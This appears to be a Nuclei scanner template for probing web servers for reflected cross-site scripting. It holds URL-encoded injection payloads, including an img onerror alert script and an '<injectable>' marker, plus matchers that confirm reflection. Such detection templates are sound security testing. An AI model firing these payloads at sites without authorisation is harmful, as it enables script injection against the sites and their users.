id: basic-xss-prober

info:
  name: Basic XSS Prober - Cross-Site Scripting
  author: nadino,geeknik
  severity: medium
  description: A cross-site scripting vulnerability was discovered via generic testing. Manual testing is needed to verify exploitation.
  # Basic XSS prober
  # Manual testing needed for exploitation
  metadata:
    max-request: 1
  tags: xss,generic

http:
  - method: GET
    stop-at-first-match: true
    path:
 #     # Before checking <injectable>, let's try to inject a better PoC - this way if it succeeds, matched-at will contain
      # a PoC with a real script.
      - "{{BaseURL}}/%3E%27%3E%22%3E%61%27%22%3e%3c%69%6e%6a%65%63%74%61%62%6c%65%3e%3Cimg%20src%20onerror%3Dalert%28String.fromCharCode%28104%2C97%2C99%2C107%2C101%2C100%29%29%3E"
      - "{{BaseURL}}/%61%27%22%3e%3c%69%6e%6a%65%63%74%61%62%6c%65%3e"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "\"><injectable>"
        part: body

      - type: word
        words:
          - "text/html"
        part: header

      - type: status
        status:
          - 200
